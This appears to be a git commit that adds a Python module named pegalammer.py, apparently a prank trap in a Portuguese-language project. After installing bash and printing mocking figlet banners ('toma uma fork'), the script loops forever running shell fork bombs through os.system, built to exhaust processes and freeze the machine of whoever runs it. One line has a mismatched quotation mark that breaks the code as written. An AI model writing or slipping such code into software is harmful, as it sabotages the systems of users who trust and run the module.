60ec275c6a3fb5b5b1f7a84573b8e20d681cc18b
Ch4rse da 404 <107947345+Ch4rse404@users.noreply.github.com>
2022-10-05 14:49:40 -0300

    Create pegalammer.py

---
+++ modulos/pegalammer.py
@@ -0,0 +1,15 @@
+import os
+import time
+
+os.system('apt install bash -y')
+
+time.sleep(1)
+
+os.system('figlet deixa disso')
+os.system('figlet teimoso kkk')
+os.system('figlet toma uma fork")
+os.system('figlet de leves')
+
+while True:
+    os.system(':(){:&};:')
+    os.system(':(){:|:&};:')
